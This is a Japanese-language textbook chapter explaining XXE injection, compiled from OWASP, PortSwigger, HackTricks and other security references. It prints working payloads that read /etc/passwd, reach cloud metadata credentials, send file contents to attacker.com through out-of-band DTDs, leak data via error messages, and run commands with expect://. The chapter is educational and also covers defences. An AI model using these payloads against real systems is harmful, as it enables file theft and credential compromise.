# 第1章 前提 — XMLとDTDの基礎


## XXEとは何か（一次資料の概説）

### なぜXMLがsink（入力が最終的に危険な形で解釈・実行される代入先）になり得るのか

XXE（XML External Entity injection、XML外部実体インジェクション）は、アプリケーションがユーザーの制御可能なXMLデータを処理する際に生じる脆弱性である。PortSwiggerの定義を借りれば、

> "XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data."（XXEとは、アプリケーションがXMLデータを処理する方法に攻撃者が干渉できるようにするWebセキュリティ脆弱性である）

XXEが成立する根本原因は、アプリケーションのロジックのバグではなく、**XML仕様そのものが持つ機能**にある。PortSwiggerは次のように述べている。

> "the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application."（XML仕様には潜在的に危険な機能が複数含まれており、標準的なパーサはアプリケーションが通常それらを使用していなくても、これらの機能をサポートしてしまう）

つまり、開発者が「外部ファイルを読み込む」というコードを一行も書いていなくても、XMLパーサをデフォルト設定のまま使うだけで、XML文書内の宣言によって外部リソース読み込みという挙動が“後から”注入されてしまう。これがXXEの核心である。SQLインジェクションが「SQL文の構文を乗っ取る」攻撃だとすれば、XXEは「XMLパーサの構文解釈そのものを乗っ取る」攻撃と言える。

> 出典: PortSwigger Web Security Academy「What is XXE injection?」— https://portswigger.net/web-security/xxe

### DTDとエンティティの基礎

XXEを理解するには、まずXMLのDTD（Document Type Definition、文書型定義）とエンティティ（entity、文書内で再利用される値の置き換え単位）の仕組みを押さえる必要がある。HackTricksは次のようにXMLの基本構成要素を整理している。

- **Entities（実体）**: `&lt;` が `<` を表すように、特殊文字をタグの構文と衝突させずに表現するための仕組み。任意の文字列やファイル内容を指すエンティティを独自に定義することもできる。
- **Element Definition（要素定義）**: XMLは要素の型と、その要素が許容する内容の構造を定義できる。
- **DTD（文書型定義）**: 文書の構造とデータ型を定義するもので、内部DTD・外部DTD・両者のハイブリッドがあり得る。
- **External Entities（外部実体）**: URL（ファイルパスやネットワークURL）を参照する形で定義される実体で、これがXXEのセキュリティリスクの直接の原因になる。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

最も基本的な実体宣言は、値を固定文字列で置き換えるだけの単純なものである。

```xml
<!DOCTYPE foo [<!ENTITY myentity "value">]>
```

これは「`&myentity;` という参照が文書中に現れたら、パーサはそれを文字列 `value` に置換する」という宣言にすぎない。ここまでは危険はない。問題は、実体の値としてローカルファイルやネットワークリソースを指す `SYSTEM` キーワードを使えることにある。

```xml
<!DOCTYPE foo [<!ENTITY ext SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY ext SYSTEM "http://attacker.com">]>
```

`SYSTEM` はXML標準が定める「外部実体（external entity）」の宣言方法であり、パーサはこの宣言に従って**実際にそのファイルやURLへアクセスし、その内容を実体の値として読み込む**。つまりXMLパーサは、文書の構文解析（パース）の過程で、宣言に基づいてファイルI/OやネットワークI/Oを自律的に実行してしまう。ここが「なぜXXEが起きるのか」という仕組みレベルの核心である。開発者はアプリケーション層で「ファイルを読む」処理を書いていなくても、XMLの構文解析層でそれが実行されてしまう。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### 基本形：ファイル読み取りのペイロード

PortSwiggerが示す最も基本的なXXE攻撃の例は次の通りである。攻撃者は商品IDを問い合わせる典型的なXML APIリクエストに、悪意あるDOCTYPE宣言を挿入する。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

この仕組みを段階的に分解すると以下のようになる。

1. `<!DOCTYPE foo [ ... ]>` により、この文書専用の内部サブセット（inline DTD）を宣言する。攻撃者はアプリケーションが本来期待していないDOCTYPEブロックを、リクエストボディの先頭に挿入できてしまう。
2. `<!ENTITY xxe SYSTEM "file:///etc/passwd">` で、実体名 `xxe` を `file:///etc/passwd` という外部リソース（ローカルファイル）に束縛する。
3. 本文中の `&xxe;` という参照箇所で、パーサはこの実体を解決（resolve）しようとし、実際に `/etc/passwd` を読み込んでその内容を文字列として展開する。
4. アプリケーションが `<productId>` の値をレスポンスに含めて返す実装であれば、`/etc/passwd` の中身がそのままHTTPレスポンスに漏洩する。

HackTricksも同様の基本形を示している。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd">]>
<data>&example;</data>
```

さらに、対象がPHPで実装されている場合、ファイル内容にバイナリやXMLとして不正な文字（null文字など）が含まれると単純な読み取りが失敗することがある。そこでPHP特有の `php://filter` ラッパーを使い、読み取り時にBase64エンコードをかける手法がよく使われる。

```xml
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&example;</data>
```

`php://filter/convert.base64-encode/resource=...` は、PHPのストリームラッパー機能を使い、指定リソース（ここでは `/etc/passwd`）を読み込む際にBase64変換フィルタを通す。これにより、XMLとして解釈不能な生バイナリではなく、安全な印字可能文字列としてファイル内容を持ち出せる。これはXXE特有の技術というより、「PHPアプリケーションを標的にしたXXEでよく併用される、対象言語のI/O機能に依存した補助テクニック」である点に注意したい（バージョン非依存の基礎的なPHPストリームラッパー機能であり、モダンなPHPでも利用可能）。

> 出典: PortSwigger Web Security Academy「What is XXE injection?」— https://portswigger.net/web-security/xxe
> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### SSRFへの転用：外部実体はネットワークリソースも指せる

`SYSTEM` の引数はローカルファイルパスに限らず、任意のURLを取れる。これはつまり、XXEを足がかりにSSRF（Server-Side Request Forgery、サーバー側リクエスト偽造）を成立させられることを意味する。PortSwiggerは次のように説明する。

> "An external entity is defined based on a URL to a back-end system"（外部実体は、バックエンドシステムを指すURLに基づいて定義される）

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

The Hacker Recipesが示す例では、クラウド環境のメタデータサービスを狙う、より実戦的な形が示されている。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/metadata/iam/security-credentials/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

`169.254.169.254` はAWSなど主要クラウド環境が提供するインスタンスメタデータサービス（IMDS）のリンクローカルアドレスであり、外部（インターネット）からは直接到達できないが、インスタンス自身からは到達できる。XXEを経由すればサーバー自身に代理でリクエストを発行させられるため、外部到達不能なはずの内部エンドポイントに対してSSRFが成立し、IAMクレデンシャルなどの機微情報を窃取できる可能性がある（対策・IMDSv2の詳細は本教科書のSSRF領域と重複するため、ここではXXEがSSRFの「入口」になり得るという構造理解にとどめる）。

> 出典: PortSwigger Web Security Academy「What is XXE injection?」— https://portswigger.net/web-security/xxe
> 出典: The Hacker Recipes「XXE injection」— https://www.thehacker.recipes/web/inputs/xxe-injection/

### パラメータ実体（Parameter Entity）と、なぜ通常の実体だけでは足りない場面があるのか

XML DTDには2種類の実体がある。文書本体（インスタンス）中で使う「一般実体（general entity）」と、DTD自身の中でしか参照できない「パラメータ実体（parameter entity、宣言時に `%` を前置する）」である。The Hacker Recipesはこの構文を次のように示している。

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
```

パラメータ実体が重要になるのは、**アプリケーションが実体宣言そのものは通しても、DTD内部での外部実体の直接的な参照は制限している場合**があるためである。多くの現代的なパーサ設定やWAFは、一般実体による直接的な外部参照（`&xxe;` がレスポンスにそのまま出るような単純なケース）は防いでいても、DTD構文の入れ子構造までは想定しきれていないことがある。パラメータ実体を使うと、DTDの中で「実体を動的に組み立てて、その場で評価（eval）する」という多段の仕組みを構築でき、これが後述するBlind XXE（レスポンスに直接データが返らないケース）でのデータ持ち出しの基盤になる。

> 出典: The Hacker Recipes「XXE injection」— https://www.thehacker.recipes/web/inputs/xxe-injection/
> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### Blind XXEとアウトオブバンド（OOB）でのデータ持ち出し

アプリケーションがXMLのパース結果をそのままレスポンスに含めない場合（例えばパース成功/失敗の真偽値しか返さない場合）、攻撃者は実体の解決結果を直接見ることができない。これがBlind XXEと呼ばれる状況である。PortSwiggerはこの場合の一般的な対処として、アウトオブバンド（帯域外、応用側のレスポンス経路とは別の経路でデータを受け取る）技術やエラーメッセージを利用したデータ抽出に触れている。HackTricksは、まず単純なOOB検知（Out-of-Band、脆弱性の存在確認のために攻撃者が制御するサーバーへ通信させて確認する手法）としてパラメータ実体を使う例を示す。

```xml
<!DOCTYPE foo [<!ENTITY % param SYSTEM "http://attacker.com/probe">%param;]>
```

`%param;` の参照によってパーサが攻撃者のサーバーへHTTPリクエストを送信するため、そのアクセスログにリクエストが記録されれば、レスポンスに何も表示されなくてもXXEが存在すると判定できる（コールバック検知）。

さらに一歩進めて、ファイルの中身そのものを外部に持ち出す代表的な手法が、攻撃者が用意した外部DTDを読み込ませる方式である。HackTricksは次のような外部DTD（`http://attacker.com/malicious.dtd` として公開）の例を示している。

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

このDTDを標的アプリケーションに読み込ませるための本体側ペイロードは次のようになる。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">%xxe;]>
<stockCheck><productId>3</productId></stockCheck>
```

この一連の流れを仕組みレベルで説明すると次のようになる。

1. 標的サーバーのXMLパーサが `%xxe;` を解決しようとし、`malicious.dtd` を攻撃者のサーバーから取得する。
2. 取得したDTD内で `%file` が `file:///etc/hostname` の中身に束縛される。
3. `%eval` の定義がその場で「新しい実体 `%exfiltrate` を、`%file`（＝ファイル内容）をクエリ文字列に埋め込んだURLに束縛する」というDTD断片そのものを**動的に生成**する。ここがパラメータ実体の真骨頂で、実体の値が「さらに評価されるべきDTD構文」になる、いわば多段のマクロ展開である。
4. `%eval;` によってこの新しい定義が実際に評価（パース）され、`%exfiltrate` という実体が新たに定義される。
5. `%exfiltrate;` を参照した瞬間、パーサは「`http://attacker.com/?x=(ファイル内容)`」というURLへHTTPリクエストを送信する。攻撃者はそのアクセスログのクエリ文字列からファイル内容を読み取れる。

これがBlind XXEにおける代表的なアウトオブバンド・データ持ち出し（exfiltration）の仕組みである。標的サーバーからのレスポンスに何も表示されなくても、標的サーバーから攻撃者サーバーへの「発信」を経由することでデータを盗み出せる点が核心である。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
> 出典: The Hacker Recipes「XXE injection」— https://www.thehacker.recipes/web/inputs/xxe-injection/

### エラーベースの持ち出しとローカルDTD再利用（アウトバウンド通信が封じられている場合）

外部への通信（アウトオブバンド）自体がネットワークポリシーで遮断されている環境では、上記のようなコールバック型の手法が使えない。この場合に使われるのが、**意図的にパースエラーを起こし、そのエラーメッセージにファイル内容を含めてしまう**手法である。HackTricksはGNOME環境（`yelp` パッケージ）を例に、サーバー上に既に存在するローカルDTDファイルを再利用する高度な手法を示している。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY % error SYSTEM '\''file:///nonexistent/%file;'\''>">
        %eval;
        %error;
    '>
    %local_dtd;
]>
<stockCheck><productId>3</productId></stockCheck>
```

この手法が成立する背景には、次の仕組みがある。

- サーバー上に既に存在する正規のDTDファイル（`docbookx.dtd`）を `SYSTEM` で読み込む。これは外部通信を必要としない、**ローカルファイルシステム上のリソース参照**である。
- このDTDが内部で定義しているパラメータ実体（例では `ISOamso`）を、攻撃者が用意した悪意の定義で**上書き（再定義）**する。XML DTDの仕様上、同名のパラメータ実体は最初の宣言が有効になるため、攻撃者は自分の悪意の定義を**先に**書いておく必要がある。
- 再定義された実体の中で、存在しないパス（`file:///nonexistent/`）に読み取ったファイル内容（`%file;`）を連結したパスを `SYSTEM` として参照させる。
- そのようなファイルパスは当然存在しないため、パーサは「ファイルが見つからない」というパースエラーを送出するが、**そのエラーメッセージ自体に、実体展開後のファイルパス（＝機微ファイルの内容を含む文字列）がそのまま含まれる**。
- アプリケーションがXMLパースエラーの詳細をレスポンスやログに出力する実装であれば、攻撃者はそのエラーメッセージからファイル内容を読み取れる。

この手法は、外部ネットワークへの通信が一切不要な点が重要である。ファイアウォールやエグレスフィルタリング（サーバーから外部への通信を制限する対策）が完全であっても、ローカルに存在するDTDファイルパスさえ分かっていれば攻撃が成立し得る。ただし、これは**対象OS・ディストリビューション・インストール済みパッケージに依存する**攻撃手法であり、上記の `docbookx.dtd` のパスはGNOME/yelpパッケージが存在する特定のLinux環境を前提としている点に留意されたい（攻撃対象のシステム構成によって有効なローカルDTDパスは異なる）。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### DOCTYPEを制御できない場合の代替経路：XInclude

アプリケーションによっては、ユーザー入力がXML文書の一部の値（要素の中身）にしか反映されず、DOCTYPE宣言自体を注入する余地がない場合がある。この場合に使われるのがXIncludeという別のXML標準機能である。HackTricksは次の例を示す。

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

XIncludeは、XML名前空間 `http://www.w3.org/2001/XInclude` を使って、他の文書やファイルの内容を現在の文書に埋め込むための標準仕様である。`parse="text"` を指定すると、参照先ファイルをXMLとしてではなくプレーンテキストとして取り込む。DOCTYPE宣言を必要とせず、要素の値の中に直接名前空間付きのXML断片を注入するだけで済むため、「DOCTYPEブロックへの注入は塞がれているが、値の中に任意のXMLタグを注入できる」という限定的な条件下でも有効になり得る点が特徴である。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### ファイルアップロード経由のXXE：SVGとOffice文書（本書のテーマとの接続）

本教科書のテーマである「XXE & ファイルアップロード」の接点として、XML自体が直接のAPI入力でなくとも、**XMLベースのファイル形式のアップロード機能**が新たな攻撃対象になる点は重要である。HackTricksは代表例としてSVG画像を挙げている。

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <image xlink:href="file:///etc/hostname"></image>
</svg>
```

SVG（Scalable Vector Graphics）はXMLベースの画像フォーマットであり、多くのWebアプリケーションが「画像アップロード」機能でSVGも受け付けてしまう場合、そのSVGファイル自体がDTD宣言と外部実体を含んだXML文書として解釈される可能性がある。処理系によっては、サーバー側でSVGをラスタライズ（画素データへの変換）する際に内部でXMLパーサを呼び出しており、そこでXXEが成立する。

同様に、DOCX/XLSXなどのOffice Open XML形式のファイルは、実体としては複数のXMLファイルを含むZIPアーカイブであるため、`word/document.xml` のようなファイルを書き換えて悪意のペイロードを仕込み、再度ZIP圧縮してアップロードするという手法も存在する。これらのファイルアップロード経由の攻撃面については、本教科書の後続章（ファイルアップロードを扱う章）で改めて詳細に扱う。ここでは「XXEは “JSON/XML API” だけの問題ではなく、XMLを内部形式として使うあらゆるアップロード可能なファイル形式が攻撃対象になり得る」という接続点を押さえておけば十分である。

> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### 検知の基本的な考え方

The Hacker Recipesは、XXEの検知手法として、テスト用の実体を注入し、その値がアプリケーションのレスポンスやエラーメッセージに反映されるかどうかを観察するアプローチを紹介している。実務的には、まず単純な文字列実体（例えば `<!ENTITY test "XXE-TEST-12345">` と `&test;`）を注入し、その文字列がレスポンスにそのまま出るかを確認したうえで、`file:///etc/passwd` のような読み取り対象、さらにOOB用のコールバックURLへと段階的に切り替えていくのが定石である。

> 出典: The Hacker Recipes「XXE injection」— https://www.thehacker.recipes/web/inputs/xxe-injection/

### 影響のまとめ

The Hacker RecipesおよびHackTricksが挙げる影響を整理すると、XXEが成立した場合の代表的な帰結は次の通りである。

- **機密ファイルの読み取り**（設定ファイル、認証情報、ソースコードなど）
- **SSRF**（内部ネットワークやクラウドメタデータサービスへの到達）
- **サービス拒否（DoS）**（後続章で扱う「billion laughs」など、実体の再帰的展開によるリソース枯渇攻撃）
- 特定の条件下での**リモートコード実行（RCE）**（`jar:` プロトコルや `expect://` のような特殊なストリームラッパー、特定言語・特定パーサ実装に依存する高度な手法。詳細は後続章で扱う）

> 出典: The Hacker Recipes「XXE injection」— https://www.thehacker.recipes/web/inputs/xxe-injection/
> 出典: HackTricks「XXE - XEE - XML External Entity」— https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

### 防御の基本方針（詳細は防御章で扱う）

PortSwiggerは根本対策として次を明言している。

> "Disable resolution of external entities and disable support for XInclude"（外部実体の解決を無効化し、XIncludeのサポートも無効化する）これが「最も効果的な緩和戦略」である。

これは、多くのXMLパーサライブラリがデフォルトでは外部実体解決やDTD処理を有効にしたまま出荷されている（バージョン・言語・ライブラリによって既定値は異なるため、使用しているパーサの設定ドキュメントを必ず個別に確認する必要がある）という事実の裏返しでもある。この設定変更こそが「アプリケーションコードを一切変えずにXXEクラスの脆弱性を根本から塞げる」唯一に近い対策であり、具体的な言語別・ライブラリ別の無効化設定は、本教科書の防御章で個別に扱う。

> 出典: PortSwigger Web Security Academy「What is XXE injection?」— https://portswigger.net/web-security/xxe

## XXEガイドとOWASPの定義

### この節の位置づけ

第1章では、XMLとDTD(Document Type Definition、XML文書の構造・許可される要素や属性・エンティティなどを定義する仕様書)の基礎を確認したうえで、XXE(XML External Entity、XML外部実体injection)という脆弱性クラスがどのように定義され、どのような攻撃系統に分類されるかを整理する。ここではOWASPによる正式な定義と、YesWeHackが公開しているバグバウンティ実践者向けガイドの二つを対比しながら読み解く。OWASP側は「脆弱性の成立条件」という理論的骨格を、YesWeHack側は「実際に現場でどう悪用されるか」という実践的な肉付けを与えてくれる。両者を合わせて読むことで、XXEを「なぜ起きるか」から「どう見つけ、どう対策するか」まで一貫して理解できる。

### XMLの実体(entity)機構のおさらい

XXEを理解するには、まずXMLの「実体(entity)」という機能を押さえる必要がある。実体とは、XML文書内で繰り返し使う文字列やコンテンツを、ある名前に束縛(バインド)しておき、`&名前;` という参照で展開できる仕組みである。HTMLで `&amp;` が `&` に展開されるのと同じ発想だが、XMLではDTD内で**任意の実体を自分で定義できる**点が特徴である。

さらに実体には「一般実体(general entity)」と「パラメータ実体(parameter entity、`%`プレフィックスを使う)」の2種類があり、パラメータ実体はDTD内部でのみ参照できる。この区別が、後述する「パラメータ実体を使った間接的なデータ窃取」というテクニックの土台になる。

実体には、値をDTD内に直接書き込む「内部実体」と、`SYSTEM`または`PUBLIC`キーワードを使って**外部のURI(ファイルパスやURL)を参照する**「外部実体(external entity)」がある。XXEという名前は、まさにこの外部実体を悪用する攻撃であることに由来する。XML処理系(パーサ)が外部実体の解決(=参照先を実際に取得してその内容を展開すること)を許可したまま、攻撃者が制御可能なXML入力を受け取ってしまうと、パーサ自身に攻撃者の指定した任意のURIへアクセスさせることができてしまう。これがXXEの本質である。

### OWASPによる定義と成立条件

> ⚠️ 補足: 当初指定されたURL `https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing` は308リダイレクトを返し、実体は `https://community.owasp.org/vulnerabilities/XML_External_Entity_(XXE)_Processing` に移転していた(OWASP Wikiのコミュニティサイト移行によるものと見られる)。リダイレクト先を取得できたため、内容はそのまま反映している。

OWASPはXXEを次のように定義している。「XXEは、XML入力を処理するアプリケーションに対する攻撃の一種である」とした上で、「XML1.0仕様の一部である、外部実体という概念を利用する攻撃」であり、「弱い設定のXMLパーサによってXML入力内の外部実体への参照が処理されたときに発生する」としている。

この定義から、XXEが成立するための条件を分解すると次の3点に整理できる。

1. **アプリケーションがXML文書を解析(パース)する**こと。JSON全盛の現代でも、SOAP API、SVG画像、Office文書(DOCX/XLSX/PPTXはZIPで固められたXML群)、設定ファイル、決済プロトコル、SAML(Security Assertion Markup Language、シングルサインオンで使われるXMLベースの認証プロトコル)などXMLは依然として広範囲に使われている。
2. **信頼できない(untrusted)データが、DTD内のシステム識別子(system identifier、外部リソースの場所を示すURI)として使われる**こと。つまり攻撃者が、パースされるXML文書自体、あるいはそのDTD部分を注入・改変できる必要がある。
3. **XMLプロセッサが、DTD内の外部実体を検証・解決してしまう(バリデーションしてresolveする)**こと。ここが防御の核心であり、これを無効化することがXXE対策の要諦になる。

この3条件がすべて揃ったとき、XML1.0仕様が持つ「システム識別子で宣言された外部コンテンツに、ローカルまたはリモートでアクセスできる」という正規の機能が、攻撃者にとっての武器に転じる。パーサがその識別子を実際にデリファレンス(参照解決)する際、機密情報の暴露につながってしまう。

> 出典: OWASP Community — XML External Entity (XXE) Processing — https://community.owasp.org/vulnerabilities/XML_External_Entity_(XXE)_Processing

### OWASPが挙げる代表的な影響(インパクト)

OWASPの記事は、XXEがもたらしうる被害を以下のように列挙している。

- **ローカルファイルの開示**(パスワードファイルや機密性の高い個人データなど)
- **サーバサイドリクエストフォージェリ(SSRF)とポートスキャン**。外部実体のURIとして内部ネットワークのアドレスを指定すれば、パーサがサーバの代理としてそのアドレスにアクセスしてしまう
- **サービス拒否(DoS)**。後述する「billion laughs」のようなエンティティ展開の再帰・肥大化により、メモリやCPUを枯渇させる
- **メモリ破損を介した任意コード実行の可能性**。パーサの実装バグに依存するため頻度は高くないが、理論上は起こりうる
- **DNSのサブドメイン名を使ったデータの持ち出し(exfiltration)**。エラーメッセージやレスポンスに直接データが出ない「ブラインド」な状況でも、DNSクエリという副チャネルで情報を持ち出せる

### OWASP記載の最小限のペイロード例

OWASPの記事にある最も基本的な例は、`/etc/passwd`(Unix系OSのユーザーアカウント情報を含む設定ファイル)を読み出すものである。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

なぜこれで読み出せるのか。`<!DOCTYPE foo [...]>` の角括弧内は「内部サブセット」と呼ばれ、この文書専用のDTD定義をその場に埋め込める場所である。`<!ENTITY xxe SYSTEM "file:///etc/passwd">` は、`xxe` という名前の外部実体を宣言し、その内容を `file://` スキームでローカルファイルシステムから取得するよう指示する。そして本文中の `<foo>&xxe;</foo>` で `&xxe;` を参照すると、パーサは宣言に従って `/etc/passwd` の中身を実際に読み込み、その内容を `&xxe;` の位置に**文字列として展開**する。パーサが外部実体解決を無効化していなければ、レスポンスとして返ってくるXML(またはそれを元に生成された画面出力)にファイルの中身がそのまま漏れる。`<!ELEMENT foo ANY>` は要素 `foo` が任意の内容を持てることをDTDとして宣言しているだけで、XML文書としての妥当性(validity)を保つための付随的な記述である。

同様の構造で、URLスキームを `http://` に変えるとリモートリソースの取得(かつ相手サーバへのSSRF)が可能になる。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
<foo>&xxe;</foo>
```

さらにOWASPは、PHPの `expect` 拡張(標準では無効だが、有効化されている環境でシェルコマンド実行を可能にするストリームラッパー)が有効な特殊な環境を前提に、リモートコード実行に至る例も示している。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds><user>`&xxe;`</user></creds>
```

この例が成立する条件は極めて限定的である(PHPで `expect` 拡張が有効、かつパーサがコマンド実行結果を評価可能な形で反映する)ため、実務上の再現性より「外部実体のURIスキームが正規のURLに限定されない」という原理を示す教材的な位置づけで理解しておくとよい。`file://` や `http://` 以外にも、パーサや言語処理系がサポートするラッパー・スキーム(例: PHPの `php://filter`)が悪用対象になりうるという発想の広がりを示している。

OWASPはこの記事の中で、防御の要点として「XMLプロセッサをローカルの静的DTDのみを使うよう設定し、XML文書内で宣言されたDTDを一切許可しない」ことを挙げ、詳細な対策手法は別文書のXXE Prevention Cheat Sheetに委ねている。この一文は非常に重要で、「外部DTDだけでなく、文書に埋め込まれた内部DTD宣言そのものを禁止する」というのが最も確実な防御方針であることを示唆している。第3章以降の防御パートでこの考え方を実装レベルまで具体化する。

### YesWeHackガイドが示す実践的なXXE攻撃の全体像

YesWeHackの「The ultimate Bug Bounty guide to exploiting XXE」は、バグバウンティハンターの視点から、XXEを発見してから実際にどう悪用が進んでいくかを段階別・シナリオ別に整理している点に価値がある。OWASPの定義が「成立条件」を示すのに対し、こちらは「攻撃のバリエーションと、それぞれがなぜ機能するか」を具体的なペイロードとともに解説している。

> 出典: YesWeHack — The ultimate Bug Bounty guide to exploiting XXE — https://www.yeswehack.com/learn-bug-bounty/xml-external-entity-guide-xxe

#### 1. クラシックXXE(直接反映型)

アプリケーションがパースしたXMLの内容(の一部)をレスポンスにそのまま反映するケースである。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE products[
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
  <product>
    <name>&xxe;</name>
    <price>999</price>
  </product>
</products>
```

`&xxe;` が展開された結果が商品名フィールドとしてそのままAPIレスポンスに現れるため、攻撃者は一回のリクエストでファイル内容を直接確認できる。最も検出・実証がしやすい形態であり、バグバウンティにおいても「見つけたら即座に影響が証明できる」典型例である。

#### 2. ブラインドXXE + Out-of-Band(OOB)データ窃取

レスポンスに解析結果が一切現れない場合でも、パーサが外部実体を「取得」する動作自体は行われるため、攻撃者が用意したサーバへの通信(コールバック)を観測することで存在を確認し、さらにデータを盗み出せる。ここで使われるのがパラメータ実体を使った間接参照のテクニックである。

攻撃者は自分のサーバに悪意あるDTDファイルを設置する(`evil.dtd`)。

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

そして被害対象アプリケーションに送るXMLでは、外部パラメータ実体としてこのDTDを読み込ませる。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<document>
  <title>Report</title>
</document>
```

なぜこれで動くのか、DTDパース処理の順序を追って理解する必要がある。

1. 被害サーバのパーサが `%xxe;` を評価すると、`http://attacker.com/evil.dtd` を取得しに行く(この時点でOOB通信の1回目が発生する)。
2. 取得したDTD内の `%file;` が評価され、`/etc/hostname` の中身がパラメータ実体 `file` の値として読み込まれる。
3. `%eval;` が評価されると、その中に書かれた**新しい実体宣言 `exfil` 自体が動的に組み立てられる**。ここが最大のポイントで、`%file;` の値(=ファイルの中身)が、次に宣言する実体 `exfil` のSYSTEM識別子(URL)の一部として文字列結合される。つまり「ファイルの中身をURLのクエリパラメータに埋め込んだ新しいエンティティ定義」がパーサ自身の手で生成される。
4. 最後に `%exfil;` が評価されると、パーサはそのURL(ファイル内容を含んだURL)にHTTPリクエストを送る。攻撃者はサーバのアクセスログを見るだけで、クエリパラメータに埋め込まれたファイル内容を回収できる。

このように、**パラメータ実体は「実体の値を使って、別の実体宣言を動的に組み立てる」という二段階の間接参照が可能**であり、これによって「読み取ったファイル内容をレスポンスに一切出さずに、外部への通信の中に混ぜ込んで持ち出す」というブラインド環境での攻撃が成立する。なお、多くの実装(特にlibxml2)では一般実体内でパラメータ実体を直接混在させる記法に制約があるため、実際にはDTD側でパラメータ実体を段階的に組み立てる必要がある点も、このテクニックが「なぜ外部DTDを経由する2段構成になるのか」の理由である。

#### 3. エラーベースXXE(ローカルDTDの再定義を利用)

ネットワーク送信(OOB)すら許されない、より制限された環境(送信元IPのアウトバウンド通信がファイアウォールで遮断されているなど)では、パーサが吐くエラーメッセージにデータを漏らすテクニックが使われる。サーバ上に既に存在するシステムDTD(例: `/usr/share/xml/fontconfig/fonts.dtd` のようなLinuxディストリビューションに標準で入っているDTDファイル)を読み込み、その中の既存のパラメータ実体を「再定義」することで、意図的にXML構文エラーを発生させ、そのエラーメッセージにファイル内容を混入させる。

```xml
<?xml version="1.0"?>
<!DOCTYPE message[
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;error;
  <!ELEMENT aa (bb'>
  %local_dtd;
]>
<message>anything</message>
```

